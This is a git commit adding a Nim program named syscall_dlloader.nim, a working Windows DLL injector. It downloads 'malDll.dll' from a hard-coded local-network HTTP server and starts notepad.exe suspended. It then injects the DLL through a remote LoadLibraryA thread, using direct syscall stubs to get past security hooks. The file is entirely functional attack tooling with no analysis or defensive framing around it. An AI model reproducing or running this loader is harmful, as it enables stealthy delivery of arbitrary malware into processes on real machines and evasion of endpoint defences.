2dce9a73487c40c92b7036da50226aa00c9d34ff
RePRGM <92693582+RePRGM@users.noreply.github.com>
2022-12-03 00:28:49 -0500

    Create syscall_dlloader.nim

---
+++ syscall_dlloader.nim
@@ -0,0 +1,148 @@
+import httpclient
+import winim
+import os
+import dynlib
+import strutils
+import ptr_math
+import GetSyscallStub
+import osproc
+
+# Unmanaged NTDLL Declarations
+type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
+type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
+
+proc toString(bytes: openarray[byte]): string =
+  result = newString(bytes.len)
+  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
+proc injct(name: string): void =
+    let k32Str: string = "kernel32.dll"
+    let loadlibAStr: string = "LoadLibraryA"
+
+    var SYSCALL_STUB_SIZE: int = 23;
+
+    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
+    let tProcess = startProcess("notepad.exe")
+    tProcess.suspend() # That's handy!
+    defer: tProcess.close()
+
+    echo "[*] Target Process: ", tProcess.processID
+
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var dll_size: SIZE_T = cast[SIZE_T](name.len)
+
+    cid.UniqueProcess = tProcess.processID
+    
+    let tProcess2 = GetCurrentProcessId()
+    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+
+    let syscallStub_NtOpenP = VirtualAllocEx(
+        pHandle2,
+        NULL,
+        cast[SIZE_T](SYSCALL_STUB_SIZE),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READ_WRITE
+    )
+
+    
+    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+
+    var oldProtection: DWORD = 0
+
+    # define NtOpenProcess
+    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
+    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtAllocateVirtualMemory
+    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
+    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
+    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtCreateThreadEx
+    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
+    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    var status: NTSTATUS
+    var success: BOOL
+
+    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP));
+    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
+    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate));
+
+    
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
+    )
+
+    echo "[*] pHandle: ", pHandle
+
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &dll_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE);
+
+    var bytesWritten: SIZE_T
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        name.cstring, #unsafeAddr shellcode, 
+        dll_size-1, 
+        addr bytesWritten);
+
+    echo "[*] NtWriteVirtualMemory: ", status
+    echo "    \\-- bytes written: ", bytesWritten
+    echo ""
+
+    let k32 = loadLib(k32Str)
+    let llAddress = k32.symAddr(loadlibAStr)
+
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        cast[LPTHREAD_START_ROUTINE](llAddress), 
+        ds, FALSE, 0, 0, 0, NULL);
+
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+
+    echo "[*] tHandle: ", tHandle
+    echo "[+] Injected"
+    echo success
+   
+proc dwnld(url: string): bool =
+    let client = newHttpClient()
+    let fileContent = client.getContent(url)
+    try:
+        let file = open("malDll.dll", fmWrite)
+        defer: file.close()
+        file.write(fileContent)
+        echo "[+] Download Successful"
+        return true
+    except:
+        echo "[-] Download Failed"
+        return false
+
+when defined(windows):
+    when defined(amd64):
+        when isMainModule:
+            if dwnld("http://192.168.0.127:8000/malDll.dll"):
+                injct("malDll.dll")
+                var pauseEx = readLine(stdin)
